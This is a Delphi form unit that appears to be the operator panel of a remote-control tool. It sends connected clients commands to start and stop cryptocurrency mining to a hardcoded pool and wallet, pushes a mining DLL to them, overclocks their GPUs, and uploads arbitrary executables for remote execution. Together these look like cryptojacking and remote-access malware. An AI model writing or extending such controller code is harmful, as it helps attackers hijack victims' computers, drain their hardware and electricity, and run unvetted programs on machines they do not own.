unit Unit5;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, DzSocket, System.NetEncoding,
  Vcl.StdCtrls, System.ImageList, Vcl.ImgList, Vcl.VirtualImageList,
  Vcl.BaseImageCollection, Vcl.ImageCollection, Vcl.ExtCtrls;

type
  TRunExecute = class(TForm)
    scGPPanel9: TscGPPanel;
    scGPButton9: TscGPButton;
    Label1: TLabel;
    Label2: TLabel;
    ImageCollection1: TImageCollection;
    VirtualImageList1: TVirtualImageList;

    // Add these new components for mining
    GroupBoxMining: TGroupBox;
    EditPool: TEdit;
    EditWallet: TEdit;
    EditWorker: TEdit;
    EditIntensity: TEdit;
    LabelPool: TLabel;
    LabelWallet: TLabel;
    LabelWorker: TLabel;
    LabelIntensity: TLabel;
    ButtonStartMining: TButton;
    ButtonStopMining: TButton;
    ButtonGetStatus: TButton;
    LabelStatus: TLabel;
    LabelHashrate: TLabel;

    // GPU Settings
    GroupBoxGPU: TGroupBox;
    EditCoreOffset: TEdit;
    EditMemoryOffset: TEdit;
    EditPowerLimit: TEdit;
    LabelCore: TLabel;
    LabelMemory: TLabel;
    LabelPower: TLabel;
    ButtonSetGPU: TButton;
    ButtonOptimizeRTX: TButton;
    Button1: TButton;

    procedure scGPButton9Click(Sender: TObject);
    procedure Label2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ButtonStartMiningClick(Sender: TObject);
    procedure ButtonStopMiningClick(Sender: TObject);
    procedure ButtonGetStatusClick(Sender: TObject);
    procedure ButtonSetGPUClick(Sender: TObject);
    procedure ButtonOptimizeRTXClick(Sender: TObject);
    procedure Button1Click(Sender: TObject);

  private
    FCurrentSocket: TDzSocket;

  public
    property CurrentSocket: TDzSocket read FCurrentSocket write FCurrentSocket;
    procedure UpdateMiningStatus(const Status: string);
    procedure LogStatus(const Status: string);
  end;

var
  RunExecute: TRunExecute;

implementation

{$R *.dfm}

procedure TRunExecute.FormCreate(Sender: TObject);
begin
 EditPool.Text := 'stratum+tcp://stratum.ravenminer.com:3838';
  EditWallet.Text := 'RNm4LMBGyfH8ddCGvncQKrMtxEydxwhUJL';
  EditWorker.Text := 'rig';
  EditIntensity.Text := '20';

  // RTX 3060 optimized settings
  EditCoreOffset.Text := '100';
  EditMemoryOffset.Text := '1200';
  EditPowerLimit.Text := '75';

  LabelStatus.Caption := 'Status: Not Connected';
  LabelHashrate.Caption := 'Hashrate: 0.00 MH/s';

  // Set initial button state

end;

procedure TRunExecute.UpdateMiningStatus(const Status: string);
begin
  LabelStatus.Caption := 'Status: ' + Status;
end;

procedure TRunExecute.LogStatus(const Status: string);
begin
  LabelStatus.Caption := Status;
end;

procedure TRunExecute.ButtonStartMiningClick(Sender: TObject);
var
  MiningCommand: string;
begin
  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  // Build mining command: "POOL|WALLET|WORKER|INTENSITY"
  MiningCommand := Format('%s|%s|%s|%s', [
    Trim(EditPool.Text),
    Trim(EditWallet.Text),
    Trim(EditWorker.Text),
    Trim(EditIntensity.Text)
  ]);

  try
    CurrentSocket.Send('S', MiningCommand);
    LabelStatus.Caption := 'Status: Start command sent';
  except
    on E: Exception do
      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
  end;
end;

procedure TRunExecute.ButtonStopMiningClick(Sender: TObject);
begin
  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  try
    CurrentSocket.Send('T', '');
    LabelStatus.Caption := 'Status: Stop command sent';
  except
    on E: Exception do
      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
  end;
end;

procedure TRunExecute.Button1Click(Sender: TObject);
begin
     if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  // Call the main form's send DLL function for this specific client
  Form2.SendMiningDLLToClient(CurrentSocket);
end;

procedure TRunExecute.ButtonGetStatusClick(Sender: TObject);
begin
  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  try
    CurrentSocket.Send('G', '');
    LabelStatus.Caption := 'Status: Requesting status...';
  except
    on E: Exception do
      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
  end;
end;

procedure TRunExecute.ButtonSetGPUClick(Sender: TObject);
var
  GPUCommand: string;
begin
  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  // Build GPU settings command: "CORE|MEMORY|POWER|75|70" (temp and fan are fixed)
  GPUCommand := Format('%s|%s|%s|75|70', [
    Trim(EditCoreOffset.Text),
    Trim(EditMemoryOffset.Text),
    Trim(EditPowerLimit.Text)
  ]);

  try
    CurrentSocket.Send('P', GPUCommand);
    LabelStatus.Caption := 'Status: GPU settings sent';
  except
    on E: Exception do
      MessageBox(Handle, PChar('Error: ' + E.Message), 'Error', MB_ICONERROR or MB_OK);
  end;
end;

procedure TRunExecute.ButtonOptimizeRTXClick(Sender: TObject);
begin
  // Set RTX 3060 optimized values
  EditCoreOffset.Text := '100';
  EditMemoryOffset.Text := '1200';
  EditPowerLimit.Text := '75';

  // Apply the settings
  ButtonSetGPUClick(Sender);
end;

procedure TRunExecute.Label2Click(Sender: TObject);
begin
  Close;
end;

procedure TRunExecute.scGPButton9Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
begin
  if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';
    if OpenDialog.Execute then
    begin
      FileName := ExtractFileName(OpenDialog.FileName);
      try
        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        try
          if FileStream.Size > 50 * 1024 * 1024 then
          begin
            MessageBox(Handle, 'File is too large. Maximum size is 50 MB.',
                       'Error', MB_ICONERROR or MB_OK);
            Exit;
          end;

          SetLength(ByteArray, FileStream.Size);
          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);
          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);
          CurrentSocket.Send('U', FileName + '|' + Base64Str);
          MessageBox(Handle, PChar('File "' + FileName + '" sent to client.'),
                     'Upload Success', MB_ICONINFORMATION or MB_OK);
        finally
          FileStream.Free;
        end;
      except
        on E: Exception do
          MessageBox(Handle, PChar('Error sending file: ' + E.Message),
                     'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  finally
    OpenDialog.Free;
  end;
end;

end.
